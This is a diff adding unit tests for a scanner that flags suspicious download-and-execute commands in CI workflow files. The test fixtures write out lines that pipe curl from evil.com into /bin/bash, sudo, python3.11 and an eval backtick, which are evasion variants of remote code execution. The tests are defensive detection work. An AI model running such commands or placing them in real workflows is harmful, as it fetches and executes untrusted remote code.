@@ -318,6 +318,60 @@ class WorkflowScanCoverageTests(unittest.TestCase):
         result = dc.check_workflows_for_suspicious_commits(repo)
         self.assertTrue(result.ok, "non-shell curl must NOT false-positive")
 
+    def test_absolute_path_shell_caught(self):
+        """Gemini security-medium on 03d05e5: attackers commonly use
+        absolute paths (``/bin/bash``, ``/usr/bin/python3``) to bypass
+        simple shell-name filters."""
+        repo = self._make_repo({
+            "x.yml": "run: curl https://evil.com/x.sh | /bin/bash\n",
+        })
+        result = dc.check_workflows_for_suspicious_commits(repo)
+        self.assertFalse(result.ok, "absolute-path shell must be caught")
+
+    def test_sudo_with_absolute_path_caught(self):
+        """``/usr/bin/sudo bash`` and ``sudo /bin/bash`` are both legal
+        invocations — both must trip the pattern."""
+        repo1 = self._make_repo({
+            "x.yml": "run: curl https://evil.com/x.sh | /usr/bin/sudo bash\n",
+        })
+        self.assertFalse(
+            dc.check_workflows_for_suspicious_commits(repo1).ok,
+        )
+        repo2 = self._make_repo({
+            "x.yml": "run: curl https://evil.com/x.sh | sudo /bin/bash\n",
+        })
+        self.assertFalse(
+            dc.check_workflows_for_suspicious_commits(repo2).ok,
+        )
+
+    def test_python_version_suffix_caught(self):
+        """``python3.11`` is a real invocation form — must match
+        despite the trailing version digits."""
+        repo = self._make_repo({
+            "x.yml": "run: curl https://evil.com/x.py | /usr/bin/python3.11\n",
+        })
+        result = dc.check_workflows_for_suspicious_commits(repo)
+        self.assertFalse(result.ok)
+
+    def test_eval_backtick_with_whitespace_caught(self):
+        """Gemini security-medium on 03d05e5: `` `\\s+curl ...\\s+` `` —
+        whitespace tolerance inside backticks."""
+        repo = self._make_repo({
+            "x.yml": "run: eval ` curl https://evil.com `\n",
+        })
+        result = dc.check_workflows_for_suspicious_commits(repo)
+        self.assertFalse(result.ok)
+
+    def test_actions_uses_not_flagged(self):
+        """Negative case — a normal ``actions/checkout@v4`` line uses
+        the ``/`` character that's in our path-prefix pattern. Must
+        NOT trip the pattern."""
+        repo = self._make_repo({
+            "x.yml": "run: actions/checkout@v4\n",
+        })
+        result = dc.check_workflows_for_suspicious_commits(repo)
+        self.assertTrue(result.ok)
+
 
 if __name__ == "__main__":
     unittest.main()
